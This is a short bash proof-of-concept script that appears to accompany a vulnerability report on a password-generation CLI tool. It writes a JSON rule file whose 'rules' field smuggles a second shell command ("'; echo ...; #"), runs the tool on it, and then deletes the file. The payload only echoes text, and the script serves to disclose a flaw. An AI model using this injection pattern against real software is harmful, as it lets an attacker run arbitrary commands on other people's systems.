#!/bin/bash

# Description: This script demonstrates command injection by using an "echo" command via the "rules" field.

echo "===== Command Injection Proof of Concept ====="
echo

# Step 1: Create a malicious JSON rule file with echo command injection
echo "[*] Creating malicious JSON rule file with echo command injection..."

cat > malicious_rules.json << EOF
{
  "chars": "ab",
  "min_length": "8",
  "max_length": "12",
  "rules": {
    "0": "[[:alpha:]]",
    "1": "a",
    "2": "'; echo 'Command executed via injection'; #"
  },
  "min_rules": "1",
  "num_rules": "3",
  "site": "example.com"
}
EOF

echo "[+] Malicious JSON file 'malicious_rules.json' created."
echo

# Step 2: Run the vulnerable application with the malicious JSON file
# Replace './bcpwm-cli' with the actual command if different
echo "[*] Running the application with the malicious JSON file..."

./bcpwm-cli -a malicious_rules.json  # Hypothetical command to load JSON rule file


# Step 3: Clean up
echo
echo "[*] Cleaning up malicious JSON file and test artifacts..."
rm -f malicious_rules.json /tmp/command_injection_test

echo "===== Proof of Concept Completed ====="
